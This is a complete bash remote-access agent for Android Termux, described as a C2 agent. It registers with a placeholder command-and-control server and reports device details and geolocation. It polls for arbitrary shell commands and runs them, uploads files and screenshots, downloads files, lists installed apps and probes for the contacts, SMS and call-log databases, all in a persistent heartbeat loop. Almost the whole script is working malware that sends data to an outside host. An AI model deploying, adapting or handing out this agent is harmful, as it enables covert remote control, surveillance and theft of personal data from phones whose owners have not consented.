#!/data/data/com.termux/files/usr/bin/bash

# Android Termux Agent - Full Access Version (Fixed)
# Based on agentimproved.ps1 but adapted for Android Termux

# C2 server configuration - REPLACE WITH YOUR ACTUAL C2 SERVER
C2="http://{C2_HOST}:{C2_PORT}"

# Agent configuration
AGENT_NAME="android_termux_agent"
PID_FILE="/data/data/com.termux/files/home/.agent.pid"
LOG_FILE="/data/data/com.termux/files/home/.agent.log"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Logging function
log() {
    local level="$1"
    local message="$2"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo -e "${BLUE}[$timestamp]${NC} ${GREEN}[$level]${NC} $message"
    # Write to log file without colors
    echo "[$timestamp] [$level] $message" >> "$LOG_FILE"
}

# Check if already running
if [ -f "$PID_FILE" ]; then
    old_pid=$(cat "$PID_FILE")
    if kill -0 "$old_pid" 2>/dev/null; then
        log "INFO" "Agent already running with PID $old_pid"
        log "INFO" "To stop the agent, run: kill $old_pid"
        log "INFO" "Or use: pkill -f android_termux_agent_fixed.sh"
        exit 0
    else
        rm -f "$PID_FILE"
    fi
fi

# Create PID file
echo $$ > "$PID_FILE"

# Global variables
HOSTNAME=""
OS_INFO=""
IP_ADDRESS=""
MANUFACTURER=""
MODEL=""
OS_VERSION=""
API_LEVEL=""
CPU_ABI=""
HARDWARE=""
TOTAL_MEMORY=""
COUNTRY=""
REGION=""
CITY=""
LATITUDE=""
LONGITUDE=""
TIMEZONE=""
ISP=""
REGISTERED="false"

# Get device information
get_device_info() {
    log "INFO" "Gathering device information..."
    
    # Get hostname
    HOSTNAME=$(getprop ro.product.model 2>/dev/null || echo "Android_Device")
    if [ "$HOSTNAME" = "unknown" ] || [ -z "$HOSTNAME" ]; then
        HOSTNAME="Android_$(date +%s)"
    fi
    
    # Get OS information
    OS_VERSION=$(getprop ro.build.version.release 2>/dev/null || echo "Unknown")
    API_LEVEL=$(getprop ro.build.version.sdk 2>/dev/null || echo "Unknown")
    MANUFACTURER=$(getprop ro.product.manufacturer 2>/dev/null || echo "Unknown")
    MODEL=$(getprop ro.product.model 2>/dev/null || echo "Unknown")
    BUILD_FINGERPRINT=$(getprop ro.build.fingerprint 2>/dev/null || echo "Unknown")
    
    # Get IP address with multiple fallback methods
    IP_ADDRESS=$(get_ip_address)
    
    # Log IP detection results (after getting the IP to avoid interference)
    if [ "$IP_ADDRESS" != "Unknown" ] && [ "$IP_ADDRESS" != "0.0.0.0" ] && [ "$IP_ADDRESS" != "127.0.0.1" ]; then
        log "INFO" "Successfully detected IP: $IP_ADDRESS"
    else
        log "WARN" "IP detection failed, using: $IP_ADDRESS"
    fi
    
    # Get hardware information
    CPU_ABI=$(getprop ro.product.cpu.abi 2>/dev/null || echo "Unknown")
    HARDWARE=$(getprop ro.hardware 2>/dev/null || echo "Unknown")
    
    # Get memory information
    TOTAL_MEM=$(cat /proc/meminfo | grep MemTotal | awk '{print $2}' 2>/dev/null || echo "0")
    TOTAL_MEM_MB=$((TOTAL_MEM / 1024))
    TOTAL_MEMORY="${TOTAL_MEM_MB}MB"
    
    # Build device info string
    OS_INFO="Android $OS_VERSION (API $API_LEVEL) - $MANUFACTURER $MODEL - $HARDWARE"
    
    log "INFO" "Device: $HOSTNAME"
    log "INFO" "OS: $OS_INFO"
    log "INFO" "IP: $IP_ADDRESS"
    log "INFO" "Memory: $TOTAL_MEMORY"
}

# Get IP address with multiple fallback methods (like PowerShell script)
get_ip_address() {
    local ip=""
    
    # Method 1: Get from network interfaces
    ip=$(ip route get 8.8.8.8 2>/dev/null | awk '{print $7}' | head -n1)
    
    # Method 2: Get from ifconfig
    if [ -z "$ip" ] || [ "$ip" = "dev" ]; then
        ip=$(ifconfig 2>/dev/null | grep "inet addr:" | grep -v "127.0.0.1" | awk '{print $2}' | cut -d: -f2 | head -n1)
    fi
    
    # Method 3: Get from ip addr
    if [ -z "$ip" ]; then
        ip=$(ip addr show 2>/dev/null | grep "inet " | grep -v "127.0.0.1" | awk '{print $2}' | cut -d/ -f1 | head -n1)
    fi
    
    # Method 4: Get from getprop
    if [ -z "$ip" ]; then
        ip=$(getprop net.dns1 2>/dev/null)
    fi
    
    # Method 5: Get external IP from reliable service (like PowerShell script)
    if [ -z "$ip" ] || [ "$ip" = "0.0.0.0" ] || [ "$ip" = "127.0.0.1" ]; then
        if command -v curl >/dev/null 2>&1; then
            external_ip=$(curl -s -m 10 "https://api.ipify.org" 2>/dev/null)
            if [ -n "$external_ip" ] && [ "$external_ip" != "127.0.0.1" ]; then
                ip="$external_ip"
                # Don't log here - it interferes with command substitution
            fi
        fi
    fi
    
    # Validate IP
    if [ -z "$ip" ] || [ "$ip" = "0.0.0.0" ] || [ "$ip" = "127.0.0.1" ]; then
        ip="Unknown"
        # Don't log here - it interferes with command substitution
    fi
    
    # Return clean IP address only
    echo "$ip"
}

# Get geolocation data (like PowerShell script)
get_geolocation() {
    log "INFO" "Getting geolocation data..."
    
    local geo_data=""
    
    # Try to get external IP and geolocation
    if command -v curl >/dev/null 2>&1; then
        # Get external IP
        local external_ip=$(curl -s -m 10 "https://api.ipify.org" 2>/dev/null)
        if [ -n "$external_ip" ] && [ "$external_ip" != "127.0.0.1" ]; then
            # Get geolocation data (like PowerShell script uses ipapi.co)
            geo_data=$(curl -s -m 10 "http://ip-api.com/json/$external_ip" 2>/dev/null)
        fi
    fi
    
    if [ -n "$geo_data" ]; then
        # Extract geolocation information
        COUNTRY=$(echo "$geo_data" | grep -o '"country":"[^"]*"' | cut -d'"' -f4)
        REGION=$(echo "$geo_data" | grep -o '"regionName":"[^"]*"' | cut -d'"' -f4)
        CITY=$(echo "$geo_data" | grep -o '"city":"[^"]*"' | cut -d'"' -f4)
        LATITUDE=$(echo "$geo_data" | grep -o '"lat":[^,]*' | cut -d':' -f2)
        LONGITUDE=$(echo "$geo_data" | grep -o '"lon":[^,]*' | cut -d':' -f2)
        TIMEZONE=$(echo "$geo_data" | grep -o '"timezone":"[^"]*"' | cut -d'"' -f4)
        ISP=$(echo "$geo_data" | grep -o '"isp":"[^"]*"' | cut -d'"' -f4)
        
        log "INFO" "Geolocation: $CITY, $REGION, $COUNTRY"
        log "INFO" "Coordinates: $LATITUDE, $LONGITUDE"
        log "INFO" "ISP: $ISP"
    else
        log "WARN" "Could not retrieve geolocation data"
        COUNTRY="Unknown"
        REGION="Unknown"
        CITY="Unknown"
        LATITUDE="0.0"
        LONGITUDE="0.0"
        TIMEZONE="UTC"
        ISP="Unknown"
    fi
}

# Test C2 connectivity
test_c2_connectivity() {
    log "INFO" "Testing C2 server connectivity..."
    
    if command -v curl >/dev/null 2>&1; then
        # Test basic connectivity
        local response=$(curl -s -m 10 "$C2" 2>/dev/null)
        if [ -n "$response" ]; then
            log "INFO" "C2 server is reachable"
            return 0
        else
            log "ERROR" "C2 server is not reachable"
            return 1
        fi
    else
        log "ERROR" "curl not available for connectivity test"
        return 1
    fi
}

# Register with C2 server (like PowerShell script)
register_with_c2() {
    log "INFO" "Registering with C2 server..."
    
    # Test connectivity first
    if ! test_c2_connectivity; then
        log "ERROR" "Cannot reach C2 server, skipping registration"
        return 1
    fi
    
    local registration_data="{\"hostname\":\"$HOSTNAME\",\"os\":\"$OS_INFO\",\"ip\":\"$IP_ADDRESS\"}"
    
    log "DEBUG" "Registration body: $registration_data"
    log "DEBUG" "Sending registration to: $C2/register"
    
    if command -v curl >/dev/null 2>&1; then
        local response=$(curl -s -X POST "$C2/register" \
            -H "Content-Type: application/json" \
            -d "$registration_data" \
            -m 30 2>/dev/null)
        
        log "DEBUG" "Registration response: $response"
        
        if [ "$response" = "OK" ]; then
            log "INFO" "Registration successful: $response"
            REGISTERED="true"
            
            # Send geolocation data
            send_geolocation_data
            return 0
        else
            log "ERROR" "Registration failed: $response"
            return 1
        fi
    else
        log "ERROR" "curl not available for registration"
        return 1
    fi
}

# Send geolocation data to C2 (like PowerShell script)
send_geolocation_data() {
    log "INFO" "Sending geolocation data..."
    
    if [ "$REGISTERED" = "true" ]; then
        local geo_data="{\"hostname\":\"$HOSTNAME\",\"ip\":\"$IP_ADDRESS\",\"country\":\"$COUNTRY\",\"region\":\"$REGION\",\"city\":\"$CITY\",\"latitude\":$LATITUDE,\"longitude\":$LONGITUDE,\"timezone\":\"$TIMEZONE\",\"isp\":\"$ISP\"}"
        
        log "DEBUG" "Geolocation body: $geo_data"
        log "DEBUG" "Sending geolocation to: $C2/api/geolocation/$HOSTNAME"
        
        if command -v curl >/dev/null 2>&1; then
            local response=$(curl -s -X POST "$C2/api/geolocation/$HOSTNAME" \
                -H "Content-Type: application/json" \
                -d "$geo_data" \
                -m 30 2>/dev/null)
            
            if [ -n "$response" ]; then
                log "INFO" "Geolocation update successful: $response"
            else
                log "WARN" "Geolocation update failed"
            fi
        fi
    fi
}

# Execute command and return output (enhanced for full access)
execute_command() {
    local cmd="$1"
    local output=""
    
    # Don't log here to avoid polluting the output
    # log "INFO" "Executing command: $cmd"
    
    # Parse command types (like PowerShell script logic)
    case "$cmd" in
        shell:*)
            # Shell command
            local shell_cmd="${cmd#shell:}"
            output=$(execute_shell_command "$shell_cmd")
            ;;
        file:*)
            # File operation
            local file_op="${cmd#file:}"
            output=$(handle_file_operation "$file_op")
            ;;
        system:*)
            # System information
            output=$(get_system_info)
            ;;
        network:*)
            # Network information
            output=$(get_network_info)
            ;;
        process:*)
            # Process information
            output=$(get_process_info)
            ;;
        screenshot)
            # Screenshot (if possible)
            output=$(capture_screenshot)
            ;;
        upload:*)
            # File upload
            local file_path="${cmd#upload:}"
            output=$(upload_file "$file_path")
            ;;
        download:*)
            # File download
            local remote_path="${cmd#download:}"
            output=$(download_file "$remote_path")
            ;;
        location)
            # Location information
            output=$(get_location_info)
            ;;
        contacts)
            # Get contacts
            output=$(get_contacts)
            ;;
        apps)
            # Get installed apps
            output=$(get_installed_apps)
            ;;
        camera)
            # Camera access
            output=$(access_camera)
            ;;
        mic)
            # Microphone access
            output=$(access_microphone)
            ;;
        stop)
            # Stop the agent
            output="Stopping Android Termux agent..."
            log "INFO" "Received stop command from C2 server"
            # Send result first, then stop
            send_command_result "$output"
            # Stop the agent after sending result
            cleanup
            ;;
        clear)
            # Clear terminal (safe command)
            output="Terminal cleared"
            ;;
        *)
            # Default: treat as shell command (like PowerShell script)
            output=$(execute_shell_command "$cmd")
            ;;
    esac
    
    # Clean the output to prevent terminal corruption
    output=$(echo "$output" | sed 's/\r//g' | sed 's/\x1b\[[0-9;]*[a-zA-Z]//g')
    
    # Don't log here to avoid polluting the output
    # log "INFO" "Command execution completed"
    echo "$output"
}

# Execute shell command (like PowerShell script logic)
execute_shell_command() {
    local cmd="$1"
    local output=""
    
    # Choose shell based on command (like PowerShell script)
    if echo "$cmd" | grep -qE "(Get-|Invoke-|Select-|Format-|New-|Out-|ls|cat|grep|find|ps|top|df|du|netstat|ss|iptables|systemctl|service|chmod|chown|cp|mv|rm|mkdir|touch|echo|printf|sed|awk|grep|cut|sort|uniq|head|tail|wc|tr|tee|nano|vim|less|more|man|info|help|--help|-h)"; then
        # Assume it's a Linux command
        # Don't log here to avoid polluting output
        # log "DEBUG" "Executing as Linux command"
        
        # Handle dangerous commands safely
        if echo "$cmd" | grep -qE "(rm -rf|dd|mkfs|fdisk|parted|shutdown|reboot|halt|poweroff)"; then
            output="Command blocked for safety: $cmd"
        else
            # Execute command with proper error handling
            output=$(bash -c "$cmd" 2>&1)
            # Clean up any terminal escape sequences
            output=$(echo "$output" | sed 's/\x1b\[[0-9;]*[a-zA-Z]//g' | sed 's/\r//g')
        fi
    else
        # Try to run as shell command
        # Don't log here to avoid polluting output
        # log "DEBUG" "Executing as shell command"
        
        # Execute command with proper error handling
        output=$(bash -c "$cmd" 2>&1)
        # Clean up any terminal escape sequences
        output=$(echo "$output" | sed 's/\x1b\[[0-9;]*[a-zA-Z]//g' | sed 's/\r//g')
    fi
    
    echo "$output"
}

# Handle file operations (full access)
handle_file_operation() {
    local operation="$1"
    local parts=(${operation//|/ })
    local action="${parts[0]}"
    local path="${parts[1]}"
    
    case "$action" in
        read)
            if [ -f "$path" ]; then
                if [ -r "$path" ]; then
                    cat "$path" 2>/dev/null || echo "Error reading file: $path"
                else
                    echo "Permission denied: Cannot read $path"
                fi
            else
                echo "File does not exist: $path"
            fi
            ;;
        write)
            if [ ${#parts[@]} -ge 3 ]; then
                local content="${parts[2]}"
                if [ -w "$(dirname "$path")" ] || [ -w "$path" ]; then
                    echo "$content" > "$path" 2>/dev/null && echo "File written: $path" || echo "Error writing file: $path"
                else
                    echo "Permission denied: Cannot write to $path"
                fi
            else
                echo "Write operation requires content"
            fi
            ;;
        delete)
            if [ -f "$path" ]; then
                if [ -w "$(dirname "$path")" ]; then
                    rm -f "$path" 2>/dev/null && echo "File deleted: $path" || echo "Error deleting file: $path"
                else
                    echo "Permission denied: Cannot delete $path"
                fi
            else
                echo "File does not exist: $path"
            fi
            ;;
        list)
            if [ -d "$path" ]; then
                if [ -r "$path" ]; then
                    ls -la "$path" 2>/dev/null || echo "Error listing directory: $path"
                else
                    echo "Permission denied: Cannot read directory: $path"
                fi
            else
                echo "Directory does not exist: $path"
            fi
            ;;
        info)
            if [ -e "$path" ]; then
                get_file_info "$path"
            else
                echo "File does not exist: $path"
            fi
            ;;
        search)
            if [ ${#parts[@]} -ge 2 ]; then
                local pattern="${parts[1]}"
                # Search in accessible directories only
                find /data /sdcard /storage 2>/dev/null -name "*$pattern*" | head -100
            else
                echo "Search requires pattern"
            fi
            ;;
        *)
            echo "Unknown file operation: $action"
            ;;
    esac
}

# Get file information (full access)
get_file_info() {
    local path="$1"
    local info=""
    
    info+="Name: $(basename "$path")\n"
    info+="Path: $(realpath "$path" 2>/dev/null || echo "$path")\n"
    info+="Type: $(if [ -d "$path" ]; then echo "Directory"; elif [ -f "$path" ]; then echo "File"; else echo "Other"; fi)\n"
    
    if [ -f "$path" ]; then
        info+="Size: $(du -h "$path" 2>/dev/null | cut -d' ' -f1 || echo "Unknown")\n"
        info+="Permissions: $(ls -l "$path" 2>/dev/null | awk '{print $1}' || echo "Unknown")\n"
        info+="MD5: $(md5sum "$path" 2>/dev/null | cut -d' ' -f1 || echo "Unknown")\n"
    fi
    
    info+="Owner: $(ls -l "$path" 2>/dev/null | awk '{print $3}' || echo "Unknown")\n"
    info+="Group: $(ls -l "$path" 2>/dev/null | awk '{print $4}' || echo "Unknown")\n"
    info+="Modified: $(stat -c %y "$path" 2>/dev/null || echo "Unknown")\n"
    info+="Accessible: $(if [ -r "$path" ]; then echo "Yes"; else echo "No"; fi)\n"
    info+="Writable: $(if [ -w "$path" ]; then echo "Yes"; else echo "No"; fi)\n"
    info+="Executable: $(if [ -x "$path" ]; then echo "Yes"; else echo "No"; fi)\n"
    
    echo -e "$info"
}

# Get system information (full access)
get_system_info() {
    local info=""
    
    info+="Device: $MANUFACTURER $MODEL\n"
    info+="Android Version: $OS_VERSION (API $API_LEVEL)\n"
    info+="Hardware: $HARDWARE\n"
    info+="CPU: $CPU_ABI\n"
    info+="Memory: $TOTAL_MEMORY\n"
    info+="Kernel: $(uname -r 2>/dev/null || echo "Unknown")\n"
    info+="Architecture: $(uname -m 2>/dev/null || echo "Unknown")\n"
    info+="Uptime: $(uptime 2>/dev/null || echo "Unknown")\n"
    info+="Load Average: $(cat /proc/loadavg 2>/dev/null || echo "Unknown")\n"
    info+="Battery: $(dumpsys battery 2>/dev/null | grep -E "level|status" | head -5 || echo "Unknown")\n"
    
    # Disk usage
    if command -v df >/dev/null 2>&1; then
        info+="Disk Usage:\n$(df -h 2>/dev/null | head -10)\n"
    fi
    
    echo -e "$info"
}

# Get network information (full access)
get_network_info() {
    local info=""
    
    info+="Local IP: $IP_ADDRESS\n"
    info+="Hostname: $(hostname 2>/dev/null || echo "Unknown")\n"
    
    # Network interfaces
    if command -v ip >/dev/null 2>&1; then
        info+="Network Interfaces:\n$(ip addr show 2>/dev/null | grep -E "inet|UP" | head -20)\n"
    elif command -v ifconfig >/dev/null 2>&1; then
        info+="Network Interfaces:\n$(ifconfig 2>/dev/null | grep -E "inet|UP" | head -20)\n"
    fi
    
    # Routing table
    if command -v ip >/dev/null 2>&1; then
        info+="Routing Table:\n$(ip route show 2>/dev/null | head -10)\n"
    elif command -v route >/dev/null 2>&1; then
        info+="Routing Table:\n$(route -n 2>/dev/null | head -10)\n"
    fi
    
    # DNS servers
    if [ -f /system/etc/resolv.conf ]; then
        info+="DNS Servers:\n$(cat /system/etc/resolv.conf 2>/dev/null | grep nameserver || echo "None found")\n"
    fi
    
    # WiFi info
    info+="WiFi Info:\n$(dumpsys wifi 2>/dev/null | grep -E "SSID|BSSID|RSSI" | head -10 || echo "Unknown")\n"
    
    echo -e "$info"
}

# Get process information (full access)
get_process_info() {
    local info=""
    
    # Top processes by CPU
    if command -v ps >/dev/null 2>&1; then
        info+="Top Processes (CPU):\n$(ps -eo pid,ppid,cmd,%cpu,%mem --sort=-%cpu | head -15 2>/dev/null || echo "ps command not available")\n"
    fi
    
    # Top processes by memory
    if command -v ps >/dev/null 2>&1; then
        info+="Top Processes (Memory):\n$(ps -eo pid,ppid,cmd,%cpu,%mem --sort=-%mem | head -15 2>/dev/null || echo "ps command not available")\n"
    fi
    
    # System processes
    info+="System Processes:\n"
    if [ -d /proc ]; then
        local proc_count=$(ls /proc | grep -E "^[0-9]+$" | wc -l)
        info+="Total processes: $proc_count\n"
    fi
    
    # Android services
    info+="Android Services:\n$(dumpsys activity services 2>/dev/null | head -20 || echo "Unknown")\n"
    
    echo -e "$info"
}

# Capture screenshot (full access)
capture_screenshot() {
    local output=""
    
    # Try different screenshot methods
    if command -v screencap >/dev/null 2>&1; then
        local screenshot_path="/data/data/com.termux/files/home/screenshot_$(date +%s).png"
        if screencap "$screenshot_path" 2>/dev/null; then
            output="Screenshot captured: $screenshot_path"
            # Try to upload to C2 server
            upload_file "$screenshot_path"
        else
            output="Screenshot failed with screencap"
        fi
    else
        output="Screenshot not available - no screencap command found"
    fi
    
    echo "$output"
}

# Get contacts (full access)
get_contacts() {
    local output=""
    
    # Try to access contacts database
    if [ -f /data/data/com.android.providers.contacts/databases/contacts2.db ]; then
        output="Contacts database found: /data/data/com.android.providers.contacts/databases/contacts2.db"
        # Could use sqlite3 to extract contacts if available
    else
        output="Contacts database not accessible"
    fi
    
    echo "$output"
}

# Get SMS messages (full access)
get_sms_messages() {
    local output=""
    
    # Try to access SMS database
    if [ -f /data/data/com.android.providers.telephony/databases/mmssms.db ]; then
        output="SMS database found: /data/data/com.android.providers.telephony/databases/mmssms.db"
        # Could use sqlite3 to extract SMS if available
    else
        output="SMS database not accessible"
    fi
    
    echo "$output"
}

# Get call logs (full access)
get_call_logs() {
    local output=""
    
    # Try to access call log database
    if [ -f /data/data/com.android.providers.contacts/databases/calllog.db ]; then
        output="Call log database found: /data/data/com.android.providers.contacts/databases/calllog.db"
        # Could use sqlite3 to extract call logs if available
    else
        output="Call log database not accessible"
    fi
    
    echo "$output"
}

# Get installed apps (full access)
get_installed_apps() {
    local output=""
    
    # List installed packages
    if command -v pm >/dev/null 2>&1; then
        output="Installed Apps:\n$(pm list packages -f 2>/dev/null | head -50)"
    else
        output="Package manager not available"
    fi
    
    echo "$output"
}

# Access camera (full access)
access_camera() {
    local output=""
    
    # Check camera availability
    if [ -d /dev/camera* ]; then
        output="Camera devices found: $(ls /dev/camera* 2>/dev/null)"
    else
        output="No camera devices found"
    fi
    
    echo "$output"
}

# Access microphone (full access)
access_microphone() {
    local output=""
    
    # Check microphone availability
    if [ -d /dev/snd ]; then
        output="Audio devices found: $(ls /dev/snd 2>/dev/null)"
    else
        output="No audio devices found"
    fi
    
    echo "$output"
}

# Upload file to C2 server
upload_file() {
    local file_path="$1"
    
    if [ ! -f "$file_path" ]; then
        echo "File does not exist: $file_path"
        return
    fi
    
    log "INFO" "Uploading file: $file_path"
    
    if command -v curl >/dev/null 2>&1; then
        local response=$(curl -s -X POST "$C2/api/files/upload" \
            -F "file=@$file_path" \
            -F "hostname=$HOSTNAME" \
            -F "description=File uploaded from Android Termux agent" \
            -F "tags=android,termux,upload" \
            -m 60 2>/dev/null)
        
        if [ -n "$response" ]; then
            log "INFO" "File uploaded successfully"
            echo "File uploaded: $file_path"
        else
            log "WARN" "File upload failed"
            echo "File upload failed: $file_path"
        fi
    else
        echo "File upload not available - curl not found"
    fi
}

# Download file from C2 server
download_file() {
    local remote_path="$1"
    local local_path="/data/data/com.termux/files/home/$(basename "$remote_path")"
    
    log "INFO" "Downloading file: $remote_path"
    
    if command -v curl >/dev/null 2>&1; then
        if curl -s -o "$local_path" "$C2/api/files/download/$remote_path" 2>/dev/null; then
            log "INFO" "File downloaded successfully: $local_path"
            echo "File downloaded: $local_path"
        else
            log "WARN" "File download failed"
            echo "File download failed: $remote_path"
        fi
    else
        echo "File download not available - curl not found"
    fi
}

# Get location information
get_location_info() {
    local info=""
    
    info+="Country: $COUNTRY\n"
    info+="Region: $REGION\n"
    info+="City: $CITY\n"
    info+="Coordinates: $LATITUDE, $LONGITUDE\n"
    info+="Timezone: $TIMEZONE\n"
    info+="ISP: $ISP\n"
    
    echo -e "$info"
}

# Send command result back to C2
send_command_result() {
    local output="$1"
    
    if [ "$REGISTERED" = "true" ]; then
        log "DEBUG" "Sending command result back to C2 server..."
        
        # Clean and escape the output for JSON - remove all control characters and escape properly
        local cleaned_output=$(echo "$output" | 
            tr -d '\r' |                    # Remove carriage returns
            tr '\n' ' ' |                   # Replace newlines with spaces
            sed 's/"/\\"/g' |              # Escape quotes
            sed 's/\\/\\\\/g' |            # Escape backslashes
            sed 's/\t/    /g' |            # Replace tabs with spaces
            sed 's/[[:cntrl:]]//g' |       # Remove any remaining control characters
            sed 's/^[[:space:]]*//' |      # Remove leading whitespace
            sed 's/[[:space:]]*$//'        # Remove trailing whitespace
        )
        
        # Create proper JSON payload
        local result_data="{\"output\":\"$cleaned_output\"}"
        
        log "DEBUG" "Result data: $result_data"
        log "DEBUG" "Sending to: $C2/result/$HOSTNAME"
        
        if command -v curl >/dev/null 2>&1; then
            local response=$(curl -s -X POST "$C2/result/$HOSTNAME" \
                -H "Content-Type: application/json" \
                -d "$result_data" \
                -m 30 2>/dev/null)
            
            log "DEBUG" "Result response: $response"
            
            if [ "$response" = "OK" ]; then
                log "INFO" "Command result sent successfully"
            else
                log "WARN" "Failed to send command result. Response: $response"
            fi
        else
            log "ERROR" "curl not available for sending command result"
        fi
    else
        log "WARN" "Agent not registered, cannot send command result"
    fi
}

# Poll for commands from C2 server (like PowerShell script)
poll_for_commands() {
    if [ "$REGISTERED" = "true" ]; then
        if command -v curl >/dev/null 2>&1; then
            local command=$(curl -s -m 30 "$C2/command/$HOSTNAME" 2>/dev/null)
            
            if [ -n "$command" ] && [ "$command" != "null" ] && [ "$command" != "" ]; then
                log "INFO" "Received command: $command"
                
                # Execute the command
                local output=$(execute_command "$command")
                log "DEBUG" "Command output length: ${#output} characters"
                log "DEBUG" "Command output preview: ${output:0:100}..."
                
                # Send the result back
                send_command_result "$output"
            fi
        fi
    fi
}

# Send heartbeat to C2 server
send_heartbeat() {
    if [ "$REGISTERED" = "true" ]; then
        if command -v curl >/dev/null 2>&1; then
            # Send a proper heartbeat to update last_seen
            local response=$(curl -s -m 10 "$C2/command/$HOSTNAME" 2>/dev/null)
            if [ -n "$response" ]; then
                log "DEBUG" "Heartbeat sent successfully"
            else
                log "DEBUG" "Heartbeat sent (no command)"
            fi
        fi
    fi
}

# Main persistent loop (like PowerShell script)
main_loop() {
    log "INFO" "Starting main loop..."
    
    # Initial delay
    sleep 5
    
    # Main loop variables (like PowerShell script)
    local last_registration=$(date +%s)
    local registration_interval=300  # Re-register every 5 minutes
    local last_geo_update=0
    local heartbeat_interval=10  # Send heartbeat every 10 seconds
    
    while true; do
        local current_time=$(date +%s)
        
        # Send heartbeat more frequently to stay online
        if [ $((current_time - last_registration)) -ge $heartbeat_interval ]; then
            send_heartbeat
            last_registration=$current_time
        fi
        
        # Re-register periodically to keep IP address current (like PowerShell script)
        if [ $((current_time - last_registration)) -ge $registration_interval ]; then
            log "INFO" "Re-registering agent..."
            if register_with_c2; then
                last_registration=$current_time
            fi
        fi
        
        # Poll for commands
        poll_for_commands
        
        # Update geolocation periodically
        if [ $((current_time - last_geo_update)) -gt 300 ]; then
            # Update every 5 minutes
            send_geolocation_data
            last_geo_update=$current_time
        fi
        
        # Sleep before next iteration (like PowerShell script)
        sleep 5
    done
}

# Signal handling
trap 'cleanup' INT TERM

# Cleanup function
cleanup() {
    log "INFO" "Shutting down Android Termux agent..."
    
    # Remove PID file
    rm -f "$PID_FILE"
    
    # Don't restart automatically - let user control it
    # if [ "$REGISTERED" = "true" ]; then
    #     log "INFO" "Restarting agent for persistence..."
    #     exec "$0" &
    # fi
    
    log "INFO" "Agent stopped. To restart, run: ./android_termux_agent_fixed.sh"
    exit 0
}

# Main execution
main() {
    log "INFO" "Android Termux Agent starting..."
    
    # Initialize device
    get_device_info
    get_geolocation
    
    # Try to register with C2
    if register_with_c2; then
        log "INFO" "Agent registered successfully"
    else
        log "WARN" "Agent registration failed, will retry"
    fi
    
    # Send initial heartbeat to ensure we're visible
    log "INFO" "Sending initial heartbeat..."
    send_heartbeat
    
    # Start main loop
    main_loop
}

# Start the agent
main "$@"
